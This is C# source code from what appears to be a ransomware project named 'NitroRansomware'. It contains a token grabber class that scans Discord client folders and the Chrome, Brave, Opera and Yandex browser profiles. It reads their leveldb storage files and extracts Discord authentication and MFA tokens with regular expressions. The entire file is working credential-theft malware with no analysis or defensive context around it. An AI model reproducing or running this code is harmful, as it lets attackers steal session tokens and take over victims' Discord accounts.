using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
namespace NitroRansomware
{
    class Grabber
    {
        private static List<string> target = new List<string>();
        private static void Scan()
        {
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            target.Add(roaming + "\\Discord");
            target.Add(roaming + "\\discordcanary");
            target.Add(roaming + "\\discordptb");
            target.Add(roaming + "\\\\Opera Software\\Opera Stable");
            target.Add(local + "\\Google\\Chrome\\User Data\\Default");
            target.Add(local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
            target.Add(local + "\\Yandex\\YandexBrowser\\User Data\\Default");          
        }
        public static List<string> Grab()
        {
            Scan();
            List<string> tokens = new List<string>();
            foreach (string x in target)
            {
                if (Directory.Exists(x))
                {
                    string path = x + "\\Local Storage\\leveldb";
                    DirectoryInfo leveldb = new DirectoryInfo(path);
                    foreach (var file in leveldb.GetFiles(false ? "*.log" : "*.ldb"))
                    {
                        string contents = file.OpenText().ReadToEnd();
                        foreach (Match match in Regex.Matches(contents, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                            tokens.Add(match.Value);

                        foreach (Match match in Regex.Matches(contents, @"mfa\.[\w-]{84}"))
                            tokens.Add(match.Value);
                    }
                }
            }
            return tokens;
        }
    }

}
